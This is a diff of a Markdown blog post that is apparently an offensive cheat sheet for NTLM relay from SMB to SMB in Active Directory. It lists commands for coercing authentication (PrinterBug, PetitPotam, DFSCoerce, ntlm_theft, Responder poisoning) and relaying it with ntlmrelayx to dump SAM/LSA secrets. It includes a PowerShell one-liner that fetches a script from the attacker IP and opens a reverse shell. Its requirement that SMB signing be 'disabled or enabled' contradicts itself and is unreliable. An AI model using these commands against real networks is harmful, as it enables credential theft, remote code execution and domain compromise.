@@ -1,26 +1,35 @@
 ---
 title: NTLM relay SMB To SMB
 date: 2026-06-12 21:37:29
+
 categories:
   - Active Directory
   - Exploitation
   - NTLM Relay
 tags:
-  - netexec
   - impacket-ntlmrelayx
   - printerbug
   - PetitPotam
-  - Responder
   - DFSCoerce
+  - netexec
+  - Responder
+cover: /img/smb-to-smb-relay-bg.png
+top_img: /img/bg-img.jpg
+description: Exploit NTLM Relay SMB to SMB.
 ---
+
+
+
+
+
+
 
 # Requirements
 
->   * The machine we relay from should be vulnerable to one of these coercion methods
->
->   * `SMB signing` on the machine we relay to should be `disabled` or `enabled`.
->
->
+> - The machine we relay from should be vulnerable to one of these coercion methods
+> 
+> - `SMB signing` on the machine we relay to should be `disabled` or `enabled`.
+
 
 ![NTLM Relay SMB to SMB](/img/ntlm-relay-smb-to-smb.png)
 
@@ -32,9 +41,10 @@ tags:
 bloodyAD -u <user> -p <password> -d <domain> -k --host <dc_hostname> add dnsRecord <hostname>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA <attacker_ip>
 ```
 
-> This makes the target’s SMB client resolve our attacker IP as itself, so when `lsass.exe` (running as SYSTEM) is coerced via PetitPotam, the relay now succeeds back to the same host, giving us a SAM/LSA dump on the DC.
+> This makes the target's SMB client resolve our attacker IP as itself, so when `lsass.exe` (running as SYSTEM) is coerced via PetitPotam, the relay now succeeds back to the same host, giving us a SAM/LSA dump on the DC.
 
-# Enumeration
+# Enumeration 
+
 
 #### Enumerate Machines With `signing:False`
 
@@ -56,11 +66,13 @@ nxc smb ip-range --gen-relay-list relayTargets.txt
 nmap -Pn --script=smb2-security-mode.nse -p 445 ip-range --open
 ```
 
-# Exploitation
 
-### Coerce Method : Coerce Machine Account
+# Exploitation 
 
-> ➜ We only need domain user credentials
+
+### Coerce Method  : Coerce Machine Account
+
+> ➜ We only need domain user credentials 
 
 ##### PrinterBug (MS-RPRN)
 
@@ -70,13 +82,15 @@ python3 printerbug.py <domain>/<user>:<password>@<target_ip> <attacker_ip>
 
 ##### PetitPotam (MS-EFSR)
 
-> ➜ if the system is not patched for CVE-2021-36942 we don’t need credentials
+
+> ➜ if the system is not patched for CVE-2021-36942 we don't need credentials
 
 ```bash
 python3 PetitPotam.py <attacker_ip> <target_ip> -u <user> -p <password> -d <domain>
 ```
 
 ##### DFSCoerce (MS-DFSNM)
+
 
 ```bash
 python3 dfscoerce.py -u <user> -p <password> <attacker_ip> <target_ip>
@@ -94,15 +108,17 @@ Coercer coerce -t <target_ip> -l <attacker_ip> -u <user> -p <password> -d <domai
 nxc smb <target_ip> -u <user> -p <password> -M coerce_plus -o LISTENER=<attacker_ip>
 ```
 
-### Coerce Method : Coerce User Account
 
-> ➜ We need only `Write access` to a shared folder
+### Coerce Method  : Coerce User Account
 
+> ➜ We need only `Write access` to a shared folder 
 ##### ntlm_theft
+
 
 ```bash
 python3 ntlm_theft.py -g all -s <attacker_ip> -f <payload_name>
 ```
+
 
 ```bash
 smbclient //<target_ip>/<share> -U <user>
@@ -116,7 +132,9 @@ smb: \> put <payload_name>.lnk
 nxc smb <target_ip> -u <user> -p <password> -M slinky -o SERVER=<attacker_ip> NAME=<lure_name>
 ```
 
+
 ##### MSSQL UNC path coercion
+
 
 ```bash
 mssqlclient.py 'inlanefreight/plaintext$:PASS@<target_ip>' -windows-auth
@@ -124,11 +142,13 @@ mssqlclient.py 'inlanefreight/plaintext$:PASS@<target_ip>' -windows-auth
 SQL (plaintext$ guest@master)> xp_dirtree \\<attacker_ip>\test.txt
 ```
 
+
 ##### LLMNR / NBT-NS / mDNS poisoning
 
-> Unlike the other coerce methods we can’t choose who gets coerced, we wait for any user to mistype a hostname then responder answer the request
 
-> ➜ Disable Responder’s SMB and HTTP servers (so `ntlmrelayx` can use them):
+> Unlike the other coerce methods we can't choose who gets coerced, we wait for any user to  mistype a hostname then responder answer the request
+
+> ➜ Disable Responder's SMB and HTTP servers (so `ntlmrelayx` can use them):
 
 ```bash
 sed -i "s/SMB = On/SMB = Off/" Responder.conf
@@ -141,9 +161,13 @@ sed -i "s/HTTP = On/HTTP = Off/" Responder.conf
 sudo python3 Responder.py -I <interface>
 ```
 
+
+
 ### Relay & Post-Exploitation
 
+
 > Regardless of which coercion method above was used, the captured SMB authentication is relayed with the same way
+
 
 > Single target
 
@@ -155,9 +179,10 @@ sudo ntlmrelayx.py -t <target_ip> -smb2support
 sudo ntlmrelayx.py -t smb://<hostname>.<domain> -smb2support
 ```
 
-> Multiple Machines
+> Multiple Machines 
 
 > We need to update `relayTargets.txt `
+
 
 ```bash
 smb://IP
@@ -170,13 +195,15 @@ smb://hostname.domain.local
 sudo ntlmrelayx.py -tf relayTargets.txt -smb2support
 ```
 
+
 ##### Normal User
 
-> If the relayed account is a normal user (non-admin), we can’t SAM dump or RCE , we can only use `-i` for an interactive SMB session and access shares that the relayed user can read and write.
+> If the relayed account is a normal user (non-admin), we can't SAM dump or RCE , we can only use `-i` for an interactive SMB session and access shares that the relayed user can read and write.
 
 ```bash
 ntlmrelayx.py -t <target_ip> -smb2support -i
 ```
+
 
 ```bash
 nc -nv 127.0.0.1 11000
@@ -203,9 +230,11 @@ sudo ntlmrelayx.py -t <target_ip> -smb2support -c
 "powershell -c IEX(New-Object NET.WebClient).DownloadString('http://<attacker_ip>:Port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <attacker_ip> -Port Port"
 ```
 
+
 ##### Socks
 
-> If we want the relayed session to keep alive we can use `-socks` flag with `ntlmrelayx`
+> If we want the relayed session to keep alive we can use `-socks` flag with `ntlmrelayx` 
+
 
 ```bash
 sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -socks
